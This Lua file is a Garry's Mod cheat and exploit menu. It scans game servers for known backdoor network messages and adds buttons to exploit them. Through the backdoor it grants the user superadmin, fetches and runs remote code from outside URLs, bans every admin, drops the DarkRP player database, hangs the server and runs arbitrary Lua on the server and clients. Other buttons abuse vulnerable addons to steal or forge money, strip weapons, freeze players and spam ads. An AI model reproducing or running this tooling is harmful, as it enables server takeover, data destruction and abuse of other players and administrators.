
surface.CreateFont("ESPFont", {size=18, bold=14})
local net = {}
local _pSetting = {}
_pSetting.Colors = {}
_pSetting.Colors.Menu = Color(255, 0, 225, 200)
_pSetting.Colors.ESPT = Color(0, 0, 0)
_pSetting.ESP = true
_pSetting.CROSSAIRE = true
_pSetting.TRACER = true
_pSetting.WALLHACK = true
_pSetting.ENTITES = {
	"prop_physics"
}


function net.Pooled( msg )
	return not (GetMessageID(msg) == 0)
end
function net.Start( msg )
	if not net.Pooled(msg) then return end
	netStart(msg)
end
function net.SendToServer()
	netSendToServer()
end
function net.WriteString( msg )
	netWriteString( msg )
end
function net.WriteTable( tab )
	if not istable(tab) then return end
	netWriteTable( tab )
end
function net.WriteFloat( f )
	netWriteFloat( f )
end
function net.WriteBit( b )
	netWriteBit( b )
end
function net.WriteBool( b )
	netWriteBool( b )
end
function net.WriteUInt( ui, nb )
	netWriteUInt( ui, nb )
end
function net.WriteInt( i, nb )
	netWriteInt( i, nb )
end
function net.WriteData( d, l )
	netWriteData( d, l )
end
function net.WriteEntity( i )
	net.WriteUInt( i, 16 )
end
function net.WriteColor( c )
	netWriteColor( c )
end

local player = {}
function player.GetAll()
	return entsFindByClass("player")
end


function ValidNetString( str )
    local status, error = pcall( net.Start, str )
    return status
end


MainFrame = vgui.Create( "DFrame" )
	MainFrame:SetTitle( "" )
	MainFrame:SetSize( 700, 500 )
	MainFrame:ShowCloseButton(true)
	MainFrame:SetDraggable(true)
	MainFrame:Center()
	MainFrame:MakePopup()
	MainFrame.Paint = function( self, w, h )
		draw.RoundedBox( 0, 0, 0, w, h, _pSetting.Colors.Menu )
	end
	MainFrame.Close = function( s )
		s:Remove()
	end
	local InGameLabel = vgui.Create( "DLabel", MainFrame )
	InGameLabel:SetText("HawkTeam")
	InGameLabel:SizeToContents()
	InGameLabel:SetPos(5, 5)

	local sheet = vgui.Create( "DPropertySheet", MainFrame )
	sheet:Dock( FILL )
	sheet.Paint = function( self, w, h )
		draw.RoundedBox( 4, 0, 0, w, h, Color( 0, 0, 0, 230 ) )
	end

	local ExploitsPanel = vgui.Create( "DScrollPanel", sheet )
	ExploitsPanel.Paint = function( self, w, h )
		draw.RoundedBox( 4, 0, 0, w, h, Color( 0, 0, 0, 0 ) )
	end
	sheet:AddSheet( "Exploits", ExploitsPanel, "icon16/bug.png" )
	local exploits = {}
	i = 2
	local function AddExploit( name, tab )
		

		exploits[name] = {}
		exploits[name] = {}
		exploits[name] = vgui.Create("DButton", ExploitsPanel)
		exploits[name]:SetPos(0, (i * 3) + (i * 15))
		exploits[name]:SetText(tab.desc)
		exploits[name]:SetSize(500, 30)
		exploits[name]:SetFont("ESPFont")
		exploits[name].DoClick = function()
			surface.PlaySound("buttons/blip1.wav")
			tab.action()
		end
		exploits[name].Paint = function( s, w, h )
			draw.RoundedBox( 0, 0, 0, w, h, Color( 0, 0, 0, 230 ) )
			draw.RoundedBox( 0, 0 + 5, h - 5, w - 10, h, Color( 0, 255, 0 ) )
		end
		i = i + 2
	end

if( ValidNetString("memeDoor") ) then
        soez = "memeDoor"
    else
    end

    if( ValidNetString("Sandbox_Armdupe") ) then 
        soez = "Sandbox_Armdupe"
    else
    end

    if( ValidNetString("DarkRP_AdminWeapons") ) then
        soez = "DarkRP_AdminWeapons"
    else
    end

    if( ValidNetString("SessionBackdoor") ) then
        soez = "SessionBackdoor"
    else
    end

    if( ValidNetString("Fix_Keypads") ) then
        soez = "Fix_Keypads"
    else
    end

    if( ValidNetString("Remove_Exploiters") ) then
        soez = "Remove_Exploiters"
    else
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
        soez = "noclipcloakaesp_chat_text"
    else
    end

    if( ValidNetString("_Defqon") ) then
        soez = "_Defqon"
    else
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
        soez = "_CAC_ReadMemory"
    else
    end

    if( ValidNetString("nostrip") ) then
        soez = "nostrip"
    else
    end

    if( ValidNetString("LickMeOut") ) then
        soez = "LickMeOut"
    else
    end

    if( ValidNetString("MoonMan") ) then
        soez = "MoonMan"
    else
    end

    if( ValidNetString("Im_SOCool") ) then
        soez = "Im_SOCool"
    else
    end

    if( ValidNetString("ULXQUERY2") ) then
        soez = "ULXQUERY2"
    else
    end
	
    if( ValidNetString("jesuslebg") ) then
        soez = "jesuslebg"
    else
    end
	
    if( ValidNetString("zilnix") ) then
        soez = "zilnix"
    else
    end

    if( ValidNetString("enablevac") ) then
        soez = "enablevac"
    else
    end

    if( ValidNetString("c") ) then
        soez = "c"
    else
    end
	
    if( ValidNetString("ÃžÃ ?D)â—˜") ) then
        soez = "ÃžÃ ?D)â—˜"
    else
    end
	
    if( ValidNetString("disablebackdoor") ) then
        soez = "disablebackdoor"
    else
    end
	
    if( ValidNetString("kill") ) then
        soez = "kill"
    else
    end
	
AddExploit("S_BD", {
		desc = "Backdoor", 
		action = function()
			local bdmenu = vgui.Create("DFrame")
			bdmenu:SetTitle("Backdoor")
			bdmenu:SetSize(500, 500)
			bdmenu:Center()
			bdmenu:SetDraggable(true)
			bdmenu:ShowCloseButton(true)
			bdmenu:MakePopup()
			bdmenu.Paint = function( s, w, h )
				draw.RoundedBoxEx(0, 0, 0, w, h, _pSetting.Colors.Menu)
			end
			function SENDLUA( lua )
				net.Start(soez)
				net.WriteString(lua)
				net.SendToServer()
			end

			function CLIENTLUA( lua )
				net.Start(soez)
				net.WriteString([[
					util.AddNetworkString("nostrip")
					net.Start("nostrip")
					net.WriteString([=[]]..lua..[[=])
					net.Broadcast()
					]])
				net.SendToServer()
				Msg(lua)
			end

			local btn = vgui.Create("DButton", bdmenu)
			btn:SetText("Superadmin")
			btn:SetPos(5, 25)
			btn:SizeToContents()
			btn.DoClick = function()
				SENDLUA([[RunConsoleCommand("ulx", "logEcho", "0") RunConsoleCommand("ulx", "adduserid", "]]..SteamID(LocalPlayer())..[[", "superadmin")]])
			end
			btn = vgui.Create("DButton", bdmenu)
			btn:SetText("Skeleton")
			btn:SetPos(5, 50)
			btn:SizeToContents()
			btn.DoClick = function()
				SENDLUA([[http.Fetch("http://www.underdone.org/leak/funtimes.lua",RunString)]])
			end

			btn = vgui.Create("DButton", bdmenu)
			btn:SetText("TFCD")
			btn:SetPos(5, 75)
			btn:SizeToContents()
			btn.DoClick = function()
				SENDLUA([[BroadcastLua([=[http.Fetch("http://textifi.hol.es/gmod.lua", RunString)]=])]])
			end

			btn = vgui.Create("DButton", bdmenu)
			btn:SetText("Ban all admins")
			btn:SetPos(5, 100)
			btn:SizeToContents()
			btn.DoClick = function()
				SENDLUA([[
				for i,v in ipairs(player.GetAll()) do
					if v:IsAdmin() then
						v:Ban(0)
					end
				end
				]])
			end

			btn = vgui.Create("DButton", bdmenu)
			btn:SetText("Server bug")
			btn:SetPos(5, 125)
			btn:SizeToContents()
			btn.DoClick = function()
				SENDLUA([[BroadcastLua([=[http.Fetch("https://ghostbin.com/paste/dcbah/raw", RunString)]=])]])
			end
			
			btn = vgui.Create("DButton", bdmenu)
			btn:SetText("PlayerModel")
			btn:SetPos(5, 150)
			btn:SizeToContents()
			btn.DoClick = function()
				SENDLUA([[
					for k,v in pairs(player.GetAll()) do v:SetModel("models/editor/playernet.Start.mdl") end
				]])
			end

			btn = vgui.Create("DButton", bdmenu)
			btn:SetText("Casser DarkRP (sql.DropQuery)")
			btn:SetPos(5, 150)
			btn:SizeToContents()
			btn.DoClick = function()
				SENDLUA([[
					sql.Query("DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)")
				]])
			end

			btn = vgui.Create("DButton", bdmenu)
			btn:SetText("Casser les command (ban/kick)")
			btn:SetPos(5, 175)
			btn:SizeToContents()
			btn.DoClick = function()
				SENDLUA([[
					local bad = {"Ban","Kick"} for k,v in next, bad do FindMetaTable("Player")[v] = nil end
				]])
			end


			btn = vgui.Create("DButton", bdmenu)
			btn:SetText("Casser la graviter")
			btn:SetPos(5, 200)
			btn:SizeToContents()
			btn.DoClick = function()
				SENDLUA([[
					RunConsoleCommand("sv_gravity", "-600")
				]])
			end

			btn = vgui.Create("DButton", bdmenu)
			btn:SetText("Restart")
			btn:SetPos(5, 225)
			btn:SizeToContents()
			btn.DoClick = function()
				SENDLUA([[
					   RunConsoleCommand("_restart")
				]])
			end

			btn = vgui.Create("DButton", bdmenu)
			btn:SetText("Shutdown")
			btn:SetPos(5, 250)
			btn:SizeToContents()
			btn.DoClick = function()
				SENDLUA([[
						while true do end
				]])
			end


			btn = vgui.Create("DButton", bdmenu)
			btn:SetText("Chat spammer")
			btn:SetPos(5, 275)
			btn:SizeToContents()
			btn.DoClick = function()
				SENDLUA([[
						hook.Add("Think", "FuxsterBuddy", function()
							RunConsoleCommand("say", "HAXTERED BABBY!!!!!!!")
						end)
				]])
			end

			btn = vgui.Create("DButton", bdmenu)
			btn:SetText("Setup clients")
			btn:SetPos(5, 300)
			btn:SizeToContents()
			btn.DoClick = function()
				SENDLUA([[
						BroadcastLua([=[
							net.Receive("nostrip", function()
								RunString(net.ReadString(), "IAMFUCKED")
							end)
						]=])
				]])
				Msg("Tous les client sont pret !")
			end


			btn = vgui.Create("DButton", bdmenu)
			btn:SetText("Fire !!!")
			btn:SetPos(150, 25)
			btn:SizeToContents()
			btn.DoClick = function()
				SENDLUA([[
					for i,v in ipairs(player.GetAll()) do
						v:Ignite()
					end
					]])
			end
			btn = vgui.Create("DButton", bdmenu)
			btn:SetText("Kill everyone")
			btn:SetPos(150, 50)
			btn:SizeToContents()
			btn.DoClick = function()
				SENDLUA([[
					for i,v in ipairs(player.GetAll()) do
						v:Kill()
					end
					]])
			end
			btn = vgui.Create("DButton", bdmenu)
			btn:SetText("Lua execution")
			btn:SetPos(150, 75)
			btn:SizeToContents()
			btn.DoClick = function()
				local frame = vgui.Create( "DFrame" )
				frame:SetSize( 800, 500 )
				frame:SetPos(0, 0)
				frame:CenterHorizontal()
				frame:SetTitle( "Run SV lua" )
				frame:SetVisible( true )
				frame:SetDraggable( true )
				frame:ShowCloseButton( true )
				frame:MakePopup()

				CodeEntry = vgui.Create("DTextEntry", frame)
				CodeEntry:SetPos(0, 25)
				CodeEntry:SetSize(600, 500)
				CodeEntry:SetMultiline(true)

				local SendLuaButton = vgui.Create( "DButton", frame ) 
				SendLuaButton:SetText( "Send to server" )				
				SendLuaButton:SetPos( 600, 470 )			
				SendLuaButton:SetSize( 200, 30 )			
				SendLuaButton.DoClick = function()		
					SENDLUA(CodeEntry:GetValue())	
				end
				local SendLuaButton = vgui.Create( "DButton", frame ) 
				SendLuaButton:SetText( "Send to clients" )				
				SendLuaButton:SetPos( 600, 440 )			
				SendLuaButton:SetSize( 200, 30 )			
				SendLuaButton.DoClick = function()		
					CLIENTLUA(CodeEntry:GetValue())	
				end

			end
		end,
	})

	AddExploit("S_SAW", {
		desc = "Strip wepons", 
		action = function()
			if IsStriping then
				IsStriping = false
				timer.Destroy("PWNED_STRIP_WEPONS_LOOP")
				Msg("Stripper off")
			else
				Derma_Query("Qui voulez-vous strip ?", "Stripper",
				 "Tout le monde", function()
					IsStriping = true
					timer.Create("PWNED_STRIP_WEPONS_LOOP", 0.1, 0,function()
						if not IsClientLua() then timer.Destroy("PWNED_STRIP_WEPONS_LOOP") IsStriping = false end
						for k, v in pairs( player.GetAll() ) do
							local gunz = EntityGetWepons(v)
							for _, j in ipairs(gunz) do
								net.Start("properties")
								net.WriteString("remove")
								net.WriteEntity( j )
								net.SendToServer()
							end
						end
					end)
					Msg("Stripper on")
				end,
				"Tout le monde sauf moi",function()
					IsStriping = true
					if not IsClientLua() then timer.Destroy("PWNED_STRIP_WEPONS_LOOP") IsStriping = false end
					timer.Create("PWNED_STRIP_WEPONS_LOOP", 0.1, 0,function()
						for k, v in pairs( player.GetAll() ) do
							if not v == LocalPlayer() then
								local gunz = EntityGetWepons(v)
								for _, j in ipairs(gunz) do
									net.Start("properties")
									net.WriteString("remove")
									net.WriteEntity( j )
									net.SendToServer()
								end
							end
						end
					end)
					Msg("Stripper on")
				end,
				"Que moi", function()
					if not IsClientLua() then timer.Destroy("PWNED_STRIP_WEPONS_LOOP") IsStriping = false end
					IsStriping = true
					timer.Create("PWNED_STRIP_WEPONS_LOOP", 0.1, 0,function()
						local gunz = EntityGetWepons(LocalPlayer())
						for _, j in ipairs(gunz) do
							net.Start("properties")
							net.WriteString("remove")
							net.WriteEntity( j )
							net.SendToServer()
						end
					end)
					Msg("Stripper on")
				end)

			end
		end,
		scan = function()
			return net.Pooled( "properties" )
		end
	})
	AddExploit("S_SMPM", {
		desc = "Steal printer money", 
		action = function()
			for k, v in pairs(entsFindByClass("adv_moneyprinter")) do
				net.Start( "SyncPrinterButtons76561198056171650" )
				net.WriteEntity(v)
				net.WriteUInt(2, 4)
				net.SendToServer()
			end
		end,
		scan = function()
			return net.Pooled("SyncPrinterButtons76561198056171650")
		end
	})
	AddExploit("S_CES", {
		desc = "Console spam with errors", 
		action = function()
			timer.Create("PWNED_SPAM_ERROR_ON_CONSOLE", 0.5, 0, function()
				net.Start( "steamid2" )
				net.WriteString( "Forku" )
				net.SendToServer()
			end)
		end,
		scan = function()
			return net.Pooled("steamid2")
		end
	})
	AddExploit("S_CME", {
		desc = "Casino Money Exploit", 
		action = function()
			net.Start( "75_plus_win" )
			net.WriteString( "50000" )
			net.WriteEntity(LocalPlayer())
			net.SendToServer()
		end,
		scan = function()
			return net.Pooled("75_plus_win")
		end
	})
	AddExploit("S_NFE", {
		desc = "NLR Freeze Everyone", 
		action = function()
			for k,v in ipairs(player.GetAll()) do
				net.Start("NLR.ActionPlayer")
				net.WriteEntity(v)
				net.SendToServer()
			end
		end,
		scan = function()
			return net.Pooled("NLR.ActionPlayer")
		end
		})

		AddExploit("S_RNN", {
		desc = "Remove all name changer NPC", 
		action = function()
			RunConsoleCommand("remove_namenpc")
		end,
		scan = function()
			return net.Pooled("NC_SetInitialName")
		end
		})
	-- 
	AddExploit("S_ME1", {
		desc = "Money Exploit", 
		action = function()
			net.Start("DarkRP_SS_Gamble")
			net.WriteInt(50000, 32)
			net.WriteInt(1, 32)
			net.WriteInt(0, 32)
			net.WriteInt(0, 32)
			net.WriteInt(1, 32)
			net.SendToServer()
		end,
		scan = function()
			return net.Pooled("DarkRP_SS_Gamble")
		end
	})
	AddExploit("S_ME2", {
		desc = "Money Exploit", 
		action = function()
			local pl = table.Random(player.GetAll())
			local plt = table.Random(player.GetAll())
			net.Start("SendMoney")
			net.WriteEntity(LocalPlayer())
			net.WriteEntity(pl)
			net.WriteEntity(plt)
			net.WriteString("-50000")
			net.SendToServer()
		end,
		scan = function()
			return net.Pooled("SendMoney")
		end
	})
	AddExploit("S_RPDM", {
		desc = "Drain Everyone's Money / Change everyone names", 
		action = function()
			for i,v in ipairs(player.GetAll()) do
				for i=1,1000 do
					net.Start("NC_GetNameChange")
					net.WriteEntity(v)
					net.WriteString(RandomString(8))
					net.WriteString(RandomString(8))
					net.SendToServer()
				end
			end
		end,
		scan = function()
			return net.Pooled("NC_GetNameChange")
		end
	})

	AddExploit("S_RPCN", {
		desc = "Change everyone names", 
		action = function()
			for i,v in ipairs(player.GetAll()) do
				net.Start("NC_SetInitialName")
				net.WriteEntity(v)
				net.WriteString(RandomString(8))
				net.WriteString(RandomString(8))
				net.SendToServer()
			end
		end,
		scan = function()
			return net.Pooled("NC_SetInitialName")
		end
	})

	AddExploit("S_ME3", {
		desc = "Money Exploit", 
		action = function()
			net.Start("BailOut")
			net.WriteEntity(LocalPlayer())
			net.WriteEntity(LocalPlayer())
			net.WriteFloat(-50000.0)
			net.SendToServer()
		end,
		scan = function()
			return net.Pooled("BailOut")
		end
	})
	AddExploit("S_IHIYHM", {
		desc = "Infinite Health If You Have Money", 
		action = function()
			timer.Create("PWNED_SPAM_HEATH_BUY", 0.01, 0, function()
				if EntityHealth(LocalPlayer()) <= 70 then
					net.Start("buyinghealth")
					net.SendToServer()
				end
			end)
		end,
		scan = function()
			return net.Pooled("buyinghealth")
		end
	})
	AddExploit("S_SGFL", {
		desc = "Screw screengrab menu", 
		action = function()
			timer.Create("PWNED_SPAM_WITH_SCREENGRAB",0.01,0,function()
				for k,v in ipairs(player.GetAll()) do
					net.Start("rtxappend2")
					net.WriteColor(Color(255, 0, 0))
					net.WriteString("BUY PWNED AT discord.gg/s26r7Ft")
					net.WriteEntity(v)
					net.SendToServer()
					net.Start("Progress")
					net.WriteEntity(v)
					net.WriteFloat(math.random(0, 100))
					net.SendToServer()
					net.Start("SendPartBack")
					net.WriteUInt(128, 32)
					net.WriteData(128, 32)
					net.SendToServer()
				end
			end)
		end,
		scan = function()
			return net.Pooled("rtxappend2")
		end
	})